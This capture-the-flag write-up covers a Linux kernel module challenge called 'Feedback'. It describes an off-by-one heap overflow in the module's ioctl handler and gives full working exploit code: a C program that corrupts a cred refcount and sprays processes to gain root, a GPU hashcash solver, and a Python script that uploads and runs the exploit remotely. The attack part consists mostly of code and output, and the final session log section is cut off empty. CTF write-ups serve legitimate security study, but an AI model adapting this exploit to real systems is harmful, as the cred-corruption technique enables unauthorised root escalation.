# Feedback
---
**CTF:** VulnByDefault CTF  
**Challenge:** Feedback (Student Feedback)  
**Category:** Pwn (Linux Kernel)  
**Flag:** `VBD{On3_byt3_a_dr3am_w0rk1ng_w1th_p1p3s_316dbee3615588c7efe25ee55cd3c281}`

---

## 1. Challenge Overview

The challenge provides a remote Linux VM running a custom kernel module called `feedback.ko`. Connecting to the server requires solving a **hashcash proof-of-work** (32-bit SHA1 partial collision) before being granted a shell inside an unprivileged QEMU virtual machine. From there, the goal is to exploit a vulnerability in the kernel module to escalate privileges to root and read the flag from `/dev/sda`.

**Remote endpoint:**
```
Host: ctf.vulnbydefault.com
Port: <changes each session>
```

On connect, the server sends a PoW challenge:
```
Send the output of: hashcash -mb32 <random_token>
```

After solving and submitting the stamp, a minimal Linux system boots:
```
Saving 256 bits of non-creditable seed for next boot
Starting syslogd: OK
Starting klogd: OK
Running sysctl: OK
Starting network: OK
Starting crond: OK

-----------------------------
Welcome to Student Feedback
-----------------------------

~ $
```

---

## 2. Vulnerability Analysis

The `feedback.ko` kernel module exposes an ioctl-based interface with three operations:
- `FEEDBACK_ADD` - allocate a feedback object
- `FEEDBACK_DEL` - free a feedback object
- `FEEDBACK_GET` - read back a feedback object

The bug is a classic **off-by-one heap overflow** in the add handler:

```c
feedback = kmalloc(size, GFP_KERNEL);
copy_from_user(feedback, user_feedback, size + 1); // copies size+1 bytes into size-byte allocation
```

This lets us overflow exactly **1 byte** past the end of any heap chunk we allocate. All objects live in the `kmalloc-192` slab (`size = 0xc0`), making the overflow target predictable.

---

## 3. Exploit Strategy

The exploit is **leakless** and **timing-based** - it doesn't require any kernel address leaks. The strategy is:

### Stage 1: Edge Finding
1. Allocate many feedback objects (IDs 1 through N) in `kmalloc-192`, each filled with a unique byte and the overflow byte set to `0x04`.
2. After each allocation, scan all previous objects to detect if any had their first byte changed to `0x04` - this means we found an **edge pair** where object A's overflow reaches into object V.
3. Clean up all other objects and reallocate at fixed IDs (`a=4002`, `v=4001`) to hold the edge stable.

### Stage 2: Credential Corruption
1. Free the victim slot (V) so the kernel can reuse it.
2. The kernel's credential allocation path (`prepare_creds` / `commit_creds`) uses `kmalloc-192` for `struct cred`.
3. Fork child processes that will have their cred objects land in the freed victim slot.
4. Use the overflow byte (`0x04`) from object A to **corrupt the low byte of the adjacent cred's refcount/usage field**.
5. This causes the cred to be freed prematurely while still in use.

### Stage 3: Use-After-Free Spray
1. Spray `execve("/bin/busybox", "ping", "127.0.0.1")` across multiple CPUs.
2. The freed cred slot gets reclaimed by one of the spray processes.
3. When the cred structure gets reallocated with attacker-controlled timing, `uid=0` / `euid=0` (root).
4. The now-root process reads `/dev/sda` and prints the flag.

### Runtime Parameters (Tuples)
The exploit accepts timing parameters that control the race:
```
/tmp/e <overflow_byte> <spray_count> <ctrl_delay_ms> <spawn_gap_us> <dec_children> <dec_gap_us> <spray_waves> <wave_gap_ms>
```

Multiple tuples are tried to increase success probability:
```
0x04 220 10 900 3 2000 6 20   (primary)
0x04 220 6  900 3 2500 6 20
0x04 220 6  900 3 2000 6 20
0x04 220 8  900 3 2000 6 20
```

### Embedded Exploit Source

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

struct request {
    uint64_t id;
    uint64_t size;
    void *name;
    void *feedback;
};

#define FEEDBACK_ADD _IOWR('s', 0, struct request)
#define FEEDBACK_DEL _IOWR('s', 1, struct request)
#define FEEDBACK_GET _IOWR('s', 2, struct request)

static const uint64_t CHUNK_SZ = 0xc0;
static const unsigned char EDGE_MARK = 0x04;
static int g_fd = -1;

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    (void)sched_setaffinity(0, sizeof(set), &set);
}

static int xio(unsigned long cmd, struct request *req) {
    int ret = ioctl(g_fd, cmd, req);
    return (ret < 0) ? -errno : ret;
}

static int add_obj(uint64_t id, unsigned char fill, unsigned char over) {
    char *name = calloc(1, 0x100);
    char *data = calloc(1, CHUNK_SZ + 1);
    if (!name || !data) {
        free(name);
        free(data);
        return -1;
    }
    memset(name, 'N', 0xff);
    memset(data, fill, CHUNK_SZ);
    data[CHUNK_SZ] = (char)over;
    struct request req = {.id = id, .size = CHUNK_SZ, .name = name, .feedback = data};
    int ret = xio(FEEDBACK_ADD, &req);
    free(name);
    free(data);
    return ret;
}

static int del_obj(uint64_t id) {
    struct request req = {.id = id};
    return xio(FEEDBACK_DEL, &req);
}

static int get_first(uint64_t id, unsigned char *b) {
    unsigned char *buf = calloc(1, CHUNK_SZ + 1);
    if (!buf) {
        return -1;
    }
    struct request req = {.id = id, .feedback = buf};
    int ret = xio(FEEDBACK_GET, &req);
    if (ret >= 0) {
        *b = buf[0];
    }
    free(buf);
    return ret;
}

static int find_edge_and_clean(int *out_a, int *out_v, int max_ids) {
    unsigned char expected[5000];
    unsigned char active[5000];
    memset(expected, 0, sizeof(expected));
    memset(active, 0, sizeof(active));

    int a = -1, v = -1, max_used = -1;
    for (int i = 1; i <= max_ids; i++) {
        unsigned char fill = (unsigned char)('A' + (i % 26));
        if (add_obj((uint64_t)i, fill, EDGE_MARK) < 0) {
            return -1;
        }
        expected[i] = fill;
        active[i] = 1;

        for (int j = 1; j < i; j++) {
            if (!active[j]) {
                continue;
            }
            unsigned char now = 0;
            if (get_first((uint64_t)j, &now) < 0) {
                continue;
            }
            if (now != expected[j]) {
                if (now == EDGE_MARK && expected[j] != EDGE_MARK) {
                    a = i;
                    v = j;
                    max_used = i;
                    goto found;
                }
                expected[j] = now;
            }
        }
    }
    for (int i = 1; i <= max_ids; i++) {
        (void)del_obj((uint64_t)i);
    }
    return -1;

found:
    for (int i = 1; i <= max_used; i++) {
        if (i == a || i == v) {
            continue;
        }
        (void)del_obj((uint64_t)i);
    }

    if (del_obj((uint64_t)a) < 0 || del_obj((uint64_t)v) < 0) {
        return -1;
    }

    const int rv = 4001;
    const int ra = 4002;
    if (add_obj((uint64_t)rv, 'X', 0x00) < 0) {
        return -1;
    }
    if (add_obj((uint64_t)ra, 'Y', EDGE_MARK) < 0) {
        (void)del_obj((uint64_t)rv);
        return -1;
    }

    unsigned char chk = 0;
    if (get_first((uint64_t)rv, &chk) < 0 || chk != EDGE_MARK) {
        (void)del_obj((uint64_t)ra);
        (void)del_obj((uint64_t)rv);
        return -1;
    }

    *out_a = ra;
    *out_v = rv;
    return 0;
}

static int read_flag_device(void) {
    int fd = open("/dev/sda", O_RDONLY);
    if (fd < 0) {
        return -1;
    }
    char buf[0x400];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n <= 0) {
        return -1;
    }
    write(1, "\n[+] /dev/sda dump:\n", 19);
    write(1, buf, (size_t)n);
    write(1, "\n", 1);
    return 0;
}

static void exec_root_ping_on_cpu(int cpu) {
    pin_cpu(cpu % 4);
    int dn = open("/tmp/.spray_sink", O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (dn >= 0) {
        dup2(dn, 1);
        dup2(dn, 2);
        close(dn);
    }
    execl("/bin/busybox", "busybox", "ping", "127.0.0.1", NULL);
    _exit(127);
}

static int controller_main(void) {
    pin_cpu(0);

    int fd = -1;
    int delay_ms = 8;
    int nping = 220;
    int spawn_us = 900;
    int waves = 6;
    int wave_gap_ms = 20;
    const char *s;

    s = getenv("CTL_FD");
    if (!s) {
        return 1;
    }
    fd = atoi(s);

    s = getenv("CTL_DELAY");
    if (s) {
        delay_ms = atoi(s);
    }
    s = getenv("PINGN");
    if (s) {
        nping = atoi(s);
    }
    s = getenv("SPAWN_US");
    if (s) {
        spawn_us = atoi(s);
    }
    s = getenv("WAVES");
    if (s) {
        waves = atoi(s);
    }
    s = getenv("WAVEGAP");
    if (s) {
        wave_gap_ms = atoi(s);
    }

    if (delay_ms < 0) {
        delay_ms = 0;
    }
    if (nping < 1) {
        nping = 1;
    }
    if (nping > 350) {
        nping = 350;
    }
    if (spawn_us < 200) {
        spawn_us = 200;
    }
    if (waves < 1) {
        waves = 1;
    }
    if (waves > 16) {
        waves = 16;
    }
    if (wave_gap_ms < 0) {
        wave_gap_ms = 0;
    }
    if (wave_gap_ms > 200) {
        wave_gap_ms = 200;
    }

    char c = 0;
    if (read(fd, &c, 1) <= 0) {
        _exit(1);
    }
    close(fd);

    usleep((useconds_t)delay_ms * 1000);

    int base = nping / waves;
    int extra = nping % waves;
    for (int w = 0; w < waves; w++) {
        int cnt = base + ((w < extra) ? 1 : 0);
        for (int i = 0; i < cnt; i++) {
            pid_t p = fork();
            if (p == 0) {
                exec_root_ping_on_cpu(0);
            }
            usleep((useconds_t)spawn_us);
        }
        if (w + 1 < waves && wave_gap_ms > 0) {
            usleep((useconds_t)wave_gap_ms * 1000);
        }
    }

    for (;;) {
        sleep(1000);
    }
}

static int stage2_main(void) {
    const char *fd_s = getenv("FBFD");
    const char *over_s = getenv("OVERB");
    const char *aid_s = getenv("AID");
    const char *dec_s = getenv("DECN");
    const char *decgap_s = getenv("DECGAP");
    unsigned char over_b = 0x06;
    int a_id = -1;
    int ndec = 5;
    int dec_gap_us = 0;

    if (!fd_s || !aid_s) {
        puts("[-] stage2 missing env");
        return 1;
    }
    if (over_s) {
        over_b = (unsigned char)strtoul(over_s, NULL, 0);
    }
    if (dec_s) {
        ndec = atoi(dec_s);
    }
    if (decgap_s) {
        dec_gap_us = atoi(decgap_s);
    }
    if (ndec < 1) {
        ndec = 1;
    }
    if (ndec > 16) {
        ndec = 16;
    }
    if (dec_gap_us < 0) {
        dec_gap_us = 0;
    }
    if (dec_gap_us > 50000) {
        dec_gap_us = 50000;
    }

    pin_cpu(0);
    g_fd = atoi(fd_s);
    a_id = atoi(aid_s);
    printf("[*] stage2 uid=%d euid=%d over=0x%02x a_id=%d dec=%d decgap=%d\n",
           getuid(), geteuid(), over_b, a_id, ndec, dec_gap_us);

    int dec_go[16][2];
    memset(dec_go, 0, sizeof(dec_go));
    for (int i = 0; i < ndec; i++) {
        if (pipe(dec_go[i]) < 0) {
            puts("[-] dec pipe failed");
            return 1;
        }
        pid_t c = fork();
        if (c == 0) {
            close(dec_go[i][1]);
            char b = 0;
            if (read(dec_go[i][0], &b, 1) <= 0) {
                _exit(1);
            }
            close(dec_go[i][0]);
            pin_cpu(0);
            _exit(0);
        }
        close(dec_go[i][0]);
    }

    int ctl_go[2];
    if (pipe(ctl_go) < 0) {
        puts("[-] ctl pipe failed");
        return 1;
    }

    char ctl_fd_buf[32];
    snprintf(ctl_fd_buf, sizeof(ctl_fd_buf), "%d", ctl_go[0]);
    pid_t ctl = fork();
    if (ctl == 0) {
        close(ctl_go[1]);
        setenv("STAGE_CTRL", "1", 1);
        setenv("CTL_FD", ctl_fd_buf, 1);
        unsetenv("STAGE2");
        execl("/proc/self/exe", "exploit", NULL);
        _exit(127);
    }
    if (ctl < 0) {
        puts("[-] fork controller failed");
        return 1;
    }

    close(ctl_go[0]);

    if (del_obj((uint64_t)a_id) < 0) {
        puts("[-] stage2 failed to free A");
        return 1;
    }
    if (add_obj(100001, 'A', over_b) < 0) {
        puts("[-] stage2 attacker add failed");
        return 1;
    }

    if (write(ctl_go[1], "C", 1) != 1) {
        puts("[-] stage2 ctl signal failed");
        return 1;
    }

    for (int i = 0; i < ndec; i++) {
        (void)write(dec_go[i][1], "D", 1);
        close(dec_go[i][1]);
        if (dec_gap_us > 0 && i + 1 < ndec) {
            usleep((useconds_t)dec_gap_us);
        }
    }

    for (volatile unsigned long warm = 0; warm < 60000000UL; warm++) {
    }

    for (int attempt = 0; attempt < 500; attempt++) {
        if (read_flag_device() == 0) {
            for (;;) {
                sleep(1000);
            }
        }
        for (volatile unsigned long spin = 0; spin < 4000000UL; spin++) {
        }
    }

    for (;;) {
        sleep(1000);
    }
}

int main(int argc, char **argv) {
    const char *ctrl = getenv("STAGE_CTRL");
    if (ctrl && !strcmp(ctrl, "1")) {
        return controller_main();
    }

    const char *st = getenv("STAGE2");
    if (st && !strcmp(st, "1")) {
        return stage2_main();
    }

    unsigned char over_b = 0x06;
    int nping = 220;
    int cdelay = 6;
    int spawn_us = 900;
    int ndec = 5;
    int dec_gap_us = 0;
    int waves = 6;
    int wave_gap_ms = 20;

    if (argc > 1) {
        over_b = (unsigned char)strtoul(argv[1], NULL, 0);
    }
    if (argc > 2) {
        nping = atoi(argv[2]);
    }
    if (argc > 3) {
        cdelay = atoi(argv[3]);
    }
    if (argc > 4) {
        spawn_us = atoi(argv[4]);
    }
    if (argc > 5) {
        ndec = atoi(argv[5]);
    }
    if (argc > 6) {
        dec_gap_us = atoi(argv[6]);
    }
    if (argc > 7) {
        waves = atoi(argv[7]);
    }
    if (argc > 8) {
        wave_gap_ms = atoi(argv[8]);
    }

    pin_cpu(0);
    printf("[*] stage1 uid=%d euid=%d over=0x%02x ping=%d cdelay=%d spawn_us=%d dec=%d decgap=%d waves=%d wavegap=%d\n",
           (int)getuid(), (int)geteuid(), over_b, nping, cdelay, spawn_us, ndec, dec_gap_us, waves, wave_gap_ms);

    g_fd = open("/dev/feedback", O_RDWR);
    if (g_fd < 0) {
        perror("open /dev/feedback");
        return 1;
    }

    int a = -1, v = -1;
    if (find_edge_and_clean(&a, &v, 900) < 0 &&
        find_edge_and_clean(&a, &v, 1400) < 0) {
        puts("[-] stage1 no edge found");
        return 1;
    }
    printf("[*] stage1 edge a=%d -> v=%d (cleaned)\n", a, v);

    if (del_obj((uint64_t)v) < 0) {
        puts("[-] stage1 free V failed");
        return 1;
    }

    char fd_buf[32], over_buf[16], aid_buf[16], ping_buf[16], delay_buf[16], spawn_buf[16], dec_buf[16], decgap_buf[16], waves_buf[16], wavegap_buf[16];
    snprintf(fd_buf, sizeof(fd_buf), "%d", g_fd);
    snprintf(over_buf, sizeof(over_buf), "0x%02x", over_b);
    snprintf(aid_buf, sizeof(aid_buf), "%d", a);
    snprintf(ping_buf, sizeof(ping_buf), "%d", nping);
    snprintf(delay_buf, sizeof(delay_buf), "%d", cdelay);
    snprintf(spawn_buf, sizeof(spawn_buf), "%d", spawn_us);
    snprintf(dec_buf, sizeof(dec_buf), "%d", ndec);
    snprintf(decgap_buf, sizeof(decgap_buf), "%d", dec_gap_us);
    snprintf(waves_buf, sizeof(waves_buf), "%d", waves);
    snprintf(wavegap_buf, sizeof(wavegap_buf), "%d", wave_gap_ms);

    setenv("STAGE2", "1", 1);
    setenv("FBFD", fd_buf, 1);
    setenv("OVERB", over_buf, 1);
    setenv("AID", aid_buf, 1);
    setenv("PINGN", ping_buf, 1);
    setenv("CTL_DELAY", delay_buf, 1);
    setenv("SPAWN_US", spawn_buf, 1);
    setenv("DECN", dec_buf, 1);
    setenv("DECGAP", decgap_buf, 1);
    setenv("WAVES", waves_buf, 1);
    setenv("WAVEGAP", wavegap_buf, 1);
    unsetenv("STAGE_CTRL");
    unsetenv("CTL_FD");

    execl("/proc/self/exe", "exploit", NULL);
    perror("execl");
    return 1;
}
```

---

## 4. The PoW Problem and GPU Solution

The server requires a **32-bit hashcash** proof-of-work before granting access. Solving this on CPU takes too long (minutes to hours), so I used a GPU-assisted approach.

**Solution:** Use **Google Colab's free GPU (NVIDIA T4)** to brute-force the hashcash stamp via a custom CUDA kernel.

The CUDA solver implements SHA1 hashing on the GPU:
- Each GPU thread tries a different nonce suffix.
- 65535 blocks x 1024 threads = ~67 million hashes per kernel launch.
- On a T4 GPU, this finds a 32-bit collision in seconds.

### Google Colab CUDA Solver (`colab gpu.py`)

This script is meant to run entirely in a Google Colab cell. It:
1. Asks the user to paste the PoW challenge line from the server
2. Compiles a CUDA solver with `nvcc`
3. Runs it on the Colab GPU
4. Outputs the solved stamp for copy-paste back to the local terminal

```python
#!/usr/bin/env python3
"""
=================================================================
 STANDALONE CUDA HASHCASH POW SOLVER FOR GOOGLE COLAB
=================================================================
This script asks you to enter the POW challenge from the server,
then compiles and runs a GPU-accelerated solver.

USAGE IN GOOGLE COLAB:
1. Run this entire script in a code cell
2. When prompted, paste the POW challenge line from server
   Example: hashcash -mb26 1fe36e63f5f0cdfd
3. Copy the output stamp and paste it back to your local terminal

=================================================================
"""
import subprocess
import re
import sys

# ==========================================
# STEP 1: Get POW Challenge from User
# ==========================================
print("=" * 70)
print("  CUDA HASHCASH POW SOLVER - Google Colab Edition")
print("=" * 70)
print()
print("Paste the POW challenge line from the server below:")
print("   Example: hashcash -mb26 1fe36e63f5f0cdfd")
print()

try:
    pow_line = input("POW Challenge: ").strip()
except (EOFError, KeyboardInterrupt):
    print("\nNo input received. Exiting.")
    sys.exit(1)

# Parse the challenge
m = re.search(r'hashcash\s+-mb(\d+)\s+(\S+)', pow_line)
if not m:
    print(f"\nInvalid POW format. Got: {pow_line}")
    print("   Expected format: hashcash -mb<BITS> <TOKEN>")
    sys.exit(1)

bits = m.group(1)
token = m.group(2)

print()
print(f"Parsed POW Challenge:")
print(f"   Bits: {bits}")
print(f"   Token: {token}")
print()

# ==========================================
# STEP 2: Compile CUDA Solver
# ==========================================
CUDA_SOLVER_CODE = r"""
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

__device__ uint32_t rol(uint32_t val, int bits) {
    return (val << bits) | (val >> (32 - bits));
}

__device__ void sha1_block(uint32_t* h, const uint8_t* block) {
    uint32_t w[16];

    #pragma unroll
    for (int i = 0; i < 16; i++) {
        w[i] = (block[i*4] << 24) | (block[i*4+1] << 16) | (block[i*4+2] << 8) | block[i*4+3];
    }

    uint32_t a = h[0], b = h[1], c = h[2], d = h[3], e = h[4];

    #pragma unroll
    for (int i = 0; i < 80; i++) {
        uint32_t f, k, temp_w;
        if (i < 20)      { f = (b & c) | ((~b) & d); k = 0x5A827999; }
        else if (i < 40) { f = b ^ c ^ d;            k = 0x6ED9EBA1; }
        else if (i < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
        else             { f = b ^ c ^ d;            k = 0xCA62C1D6; }

        if (i < 16) {
            temp_w = w[i];
        } else {
            temp_w = rol(w[(i-3)&15] ^ w[(i-8)&15] ^ w[(i-14)&15] ^ w[(i-16)&15], 1);
            w[i&15] = temp_w;
        }

        uint32_t temp = rol(a, 5) + f + e + k + temp_w;
        e = d; d = c; c = rol(b, 30); b = a; a = temp;
    }

    h[0] += a; h[1] += b; h[2] += c; h[3] += d; h[4] += e;
}

__global__ void hashcash_kernel(int bits, const char* prefix, int prefix_len,
                                 uint64_t* found_counter, int* success_flag, uint64_t offset) {
    uint64_t tid = offset + ((uint64_t)blockIdx.x * blockDim.x + threadIdx.x);
    if (*success_flag) return;

    uint8_t buffer[64];
    for(int i = 0; i < prefix_len; i++) buffer[i] = prefix[i];

    char hex_chars[] = "0123456789abcdef";
    uint64_t temp_tid = tid;
    int suffix_len = 0;
    char suffix[16];

    if (temp_tid == 0) {
        suffix[0] = '0';
        suffix_len = 1;
    } else {
        while(temp_tid > 0) {
            suffix[suffix_len++] = hex_chars[temp_tid % 16];
            temp_tid /= 16;
        }
    }

    for(int i = 0; i < suffix_len; i++) {
        buffer[prefix_len + i] = suffix[suffix_len - 1 - i];
    }

    int total_len = prefix_len + suffix_len;
    buffer[total_len] = 0x80;
    for (int i = total_len + 1; i < 62; i++) {
        buffer[i] = 0;
    }

    uint64_t bit_len = total_len * 8;
    buffer[63] = bit_len & 0xFF;
    buffer[62] = (bit_len >> 8) & 0xFF;

    uint32_t h[5] = { 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0 };
    sha1_block(h, buffer);

    int zero_bits = 0;
    for (int i = 0; i < 5; i++) {
        uint32_t val = h[i];
        if (val == 0) {
            zero_bits += 32;
        } else {
            for (int k = 31; k >= 0; k--) {
                if ((val >> k) & 1) break;
                zero_bits++;
            }
            break;
        }
    }

    if (zero_bits >= bits) {
        if (atomicCAS(success_flag, 0, 1) == 0) {
            *found_counter = tid;
        }
    }
}

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    int bits = atoi(argv[1]);
    const char* resource = argv[2];

    char host_prefix[256];
    time_t t = time(NULL);
    struct tm tm_utc;
    gmtime_r(&t, &tm_utc);
    char date[16];
    strftime(date, sizeof(date), "%y%m%d", &tm_utc);
    srand(time(NULL));

    snprintf(host_prefix, sizeof(host_prefix), "1:%d:%s:%s::gX%04d:",
             bits, date, resource, rand() % 10000);
    int prefix_len = strlen(host_prefix);

    char *d_prefix;
    cudaMalloc((void**)&d_prefix, prefix_len + 1);
    cudaMemcpy(d_prefix, host_prefix, prefix_len + 1, cudaMemcpyHostToDevice);

    uint64_t *d_found_counter;
    int *d_success_flag;
    cudaMalloc(&d_found_counter, sizeof(uint64_t));
    cudaMalloc(&d_success_flag, sizeof(int));

    int initial_flag = 0;
    cudaMemcpy(d_success_flag, &initial_flag, sizeof(int), cudaMemcpyHostToDevice);

    int threadsPerBlock = 1024;
    int blocksPerGrid = 65535;
    uint64_t offset = 0;
    int loops = 0;

    while(initial_flag == 0) {
        hashcash_kernel<<<blocksPerGrid, threadsPerBlock>>>(
            bits, d_prefix, prefix_len, d_found_counter, d_success_flag, offset);

        cudaError_t err = cudaGetLastError();
        if (err != cudaSuccess) {
            printf("[-] FATAL GPU ERROR: %s\n", cudaGetErrorString(err));
            return 1;
        }

        cudaDeviceSynchronize();
        cudaMemcpy(&initial_flag, d_success_flag, sizeof(int), cudaMemcpyDeviceToHost);
        offset += ((uint64_t)blocksPerGrid * threadsPerBlock);
        loops++;

        if (loops % 10 == 0) {
            printf("[GPU] Checked %llu million hashes...\n",
                   (unsigned long long)(offset / 1000000));
            fflush(stdout);
        }
    }

    uint64_t result_counter;
    cudaMemcpy(&result_counter, d_found_counter, sizeof(uint64_t), cudaMemcpyDeviceToHost);

    printf("\n[SUCCESS] %s%llx\n", host_prefix, (unsigned long long)result_counter);

    cudaFree(d_prefix);
    cudaFree(d_found_counter);
    cudaFree(d_success_flag);
    return 0;
}
"""

with open("cuda_solver.cu", "w") as f:
    f.write(CUDA_SOLVER_CODE)

print("Compiling CUDA solver with nvcc...")
result = subprocess.run(["nvcc", "-O3", "cuda_solver.cu", "-o", "cuda_pow_solver"],
                       capture_output=True, text=True)
if result.returncode != 0:
    print(f"Compilation failed:\n{result.stderr}")
    sys.exit(1)

print("CUDA Solver compiled successfully!")
print()

# ==========================================
# STEP 3: Run the Solver
# ==========================================
print("Running GPU solver...")
print("=" * 70)

process = subprocess.Popen(
    ["./cuda_pow_solver", bits, token],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)

stamp_result = None
for line in process.stdout:
    print(line, end="", flush=True)
    if line.startswith("[SUCCESS]"):
        stamp_result = line.replace("[SUCCESS]", "").strip()

process.wait()

print("=" * 70)
print()

if stamp_result:
    print("POW SOLVED!")
    print()
    print("COPY THIS STAMP AND PASTE IT IN YOUR LOCAL TERMINAL:")
    print()
    print("=" * 70)
    print(stamp_result)
    print("=" * 70)
    print()
else:
    print("Failed to find valid stamp")
    sys.exit(1)
```

---

## 5. Remote Solver Script (`remote_manual_pow.py`)

This is the script used during the solve. It:
1. Asks the user to enter the **port number** (changes each session)
2. Displays the PoW challenge for the user to **copy to Google Colab**
3. Waits for the user to **paste the solved stamp** back

It then connects, uploads the compiled exploit via base64, runs multiple parameter tuples, and checks for the flag.

```python
import base64
import os
import re
import select
import socket
import sys
import textwrap
import time

PROMPTS = [b"~ $ ", b"/ # ", b"# "]
FLAG_RE = re.compile(rb"VBD\{[^}\r\n]+\}")


def has_prompt(buf: bytes) -> bool:
    return any(p in buf for p in PROMPTS)


def recv_until(sock: socket.socket, timeout: float, *, want_prompt=False):
    deadline = time.time() + timeout
    buf = b""
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.25)
        if not r:
            continue
        chunk = sock.recv(4096)
        if not chunk:
            return buf, "eof"
        buf += chunk

        if FLAG_RE.search(buf):
            return buf, "flag"
        if b"Wrong Proof of Work" in buf:
            return buf, "pow_wrong"
        if b"Failed to get \"write\" lock" in buf:
            return buf, "busy"
        if b"gdbstub: couldn't create chardev" in buf:
            return buf, "busy"
        if b"Kernel panic" in buf:
            return buf, "panic"
        if want_prompt and has_prompt(buf):
            return buf, "prompt"

    return buf, "timeout"


def read_pow_line(sock: socket.socket, timeout: float):
    deadline = time.time() + timeout
    buf = b""
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.25)
        if not r:
            continue
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if b"\n" in buf:
            line = buf.split(b"\n", 1)[0].decode(errors="ignore").strip()
            return line
    return ""


def connect_and_pow(host: str, port: int):
    sock = socket.create_connection((host, port), timeout=10)
    sock.setblocking(False)

    line = read_pow_line(sock, timeout=20)
    if not line:
        sock.close()
        raise RuntimeError("failed to read PoW line")

    m = re.search(r"hashcash -mb(\d+)\s+(\S+)", line)
    if not m:
        sock.close()
        raise RuntimeError(f"unexpected banner: {line!r}")

    bits = int(m.group(1))
    resource = m.group(2)
    print(f"[pow] bits={bits} resource={resource}")
    print(f"[pow] challenge: {line}")
    print()
    print(">>> Solve this in Google Colab, then paste the stamp below <<<")
    print()
    stamp = input("Stamp: ").strip()
    if not stamp:
        sock.close()
        raise RuntimeError("empty stamp")

    sock.sendall((stamp + "\n").encode())

    boot, state = recv_until(sock, 240, want_prompt=True)
    if state == "pow_wrong":
        sock.close()
        raise RuntimeError("PoW rejected")
    if state == "busy":
        sock.close()
        raise RuntimeError("remote busy (qemu lock)")
    if state in ("prompt", "flag"):
        return sock, boot

    sock.close()
    raise RuntimeError(f"failed to reach prompt (state={state})")


def send_line(sock: socket.socket, line: str):
    sock.sendall(line.encode() + b"\n")


def upload_exploit(sock: socket.socket, local_path: str):
    raw = open(local_path, "rb").read()
    b64 = base64.b64encode(raw).decode()
    wrapped = textwrap.fill(b64, width=512)

    payload = "cat > /tmp/e.b64 <<'EOF'\n" + wrapped + "\nEOF\n"
    sock.sendall(payload.encode())
    out, state = recv_until(sock, 120, want_prompt=True)
    if state != "prompt":
        return out, state

    send_line(sock, "base64 -d /tmp/e.b64 > /tmp/e && chmod +x /tmp/e && rm -f /tmp/e.b64")
    out2, state2 = recv_until(sock, 60, want_prompt=True)
    return out + out2, state2


def attempt_on_connection(sock: socket.socket, tuples, max_attempts: int):
    all_out = b""
    for i in range(max_attempts):
        tpl = tuples[i % len(tuples)]
        cmd = f"/tmp/e {tpl}"
        print(f"[try] attempt={i+1} cmd={cmd}")
        send_line(sock, cmd)
        out, state = recv_until(sock, 40, want_prompt=True)
        all_out += out

        m = FLAG_RE.search(all_out)
        if m:
            return all_out, "flag", m.group(0).decode(errors="ignore")

        if state in ("panic", "eof", "busy", "pow_wrong"):
            return all_out, state, ""

        if state == "timeout":
            return all_out, "timeout", ""

    return all_out, "attempts_done", ""


def main():
    host = "ctf.vulnbydefault.com"
    bin_path = "exploit"

    port_str = input("Enter port number: ").strip()
    if not port_str:
        print("port is required")
        return 1
    port = int(port_str)

    tuples = [
        "0x04 220 10 900 3 2000 6 20",
        "0x04 220 6 900 3 2500 6 20",
        "0x04 220 6 900 3 2000 6 20",
        "0x04 220 8 900 3 2000 6 20",
    ]

    if not os.path.exists(bin_path):
        print(f"binary not found: {bin_path}")
        return 1

    print(f"[conn] connecting to {host}:{port}")
    sock = None
    try:
        sock, boot = connect_and_pow(host, port)
        m0 = FLAG_RE.search(boot)
        if m0:
            print(m0.group(0).decode(errors="ignore"))
            return 0

        up_out, up_state = upload_exploit(sock, bin_path)
        m1 = FLAG_RE.search(up_out)
        if m1:
            print(m1.group(0).decode(errors="ignore"))
            return 0
        if up_state != "prompt":
            print(f"[conn] upload failed state={up_state}")
            return 1

        out, state, flag = attempt_on_connection(sock, tuples, len(tuples))
        if flag:
            print(f"[+] FLAG {flag}")
            return 0

        print(f"[conn] ended state={state}")
        if state == "attempts_done":
            try:
                send_line(sock, "exit")
                recv_until(sock, 20, want_prompt=False)
            except Exception:
                pass

    except Exception as e:
        print(f"[conn] error: {e}")
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass

    print("[-] no flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

---

## 6. Solve Workflow (Step by Step)

### Prerequisites
- Save the embedded C source above as `exploit.c`
- Compile it to a local binary named `exploit`
- Google Colab notebook with GPU runtime enabled
- `colab gpu.py` pasted into a Colab code cell

Compile command:
```bash
gcc -O2 -o exploit exploit.c
```

### Step 1: Start the Remote Solver
```
cd feedback/
python3 remote_manual_pow.py
```
```
Enter port number: 12625
[conn] connecting to ctf.vulnbydefault.com:12625
[pow] bits=32 resource=avvDFOzS64YNPLqO
[pow] challenge: Send the output of: hashcash -mb32 avvDFOzS64YNPLqO

>>> Solve this in Google Colab, then paste the stamp below <<<

Stamp:
```

### Step 2: Solve PoW in Google Colab
Run the Colab cell. When prompted, paste the challenge:
```
POW Challenge: hashcash -mb32 avvDFOzS64YNPLqO
```

The GPU solver finds the stamp in seconds:
```
[SUCCESS] 1:32:260305:avvDFOzS64YNPLqO::gX9574:880dd763
```

### Step 3: Paste Stamp Back
Copy the stamp from Colab and paste it back in the local terminal:
```
Stamp: 1:32:260305:avvDFOzS64YNPLqO::gX9574:880dd763
```

### Step 4: Exploit Runs Automatically
The script uploads the exploit binary via base64, decodes it on the remote VM, and runs it with multiple parameter tuples:

```
[try] attempt=1 cmd=/tmp/e 0x04 220 10 900 3 2000 6 20
[+] FLAG VBD{On3_byt3_a_dr3am_w0rk1ng_w1th_p1p3s_316dbee3615588c7efe25ee55cd3c281}
```

---

## 7. Full Solve Session Log

```
Enter port number: 12625
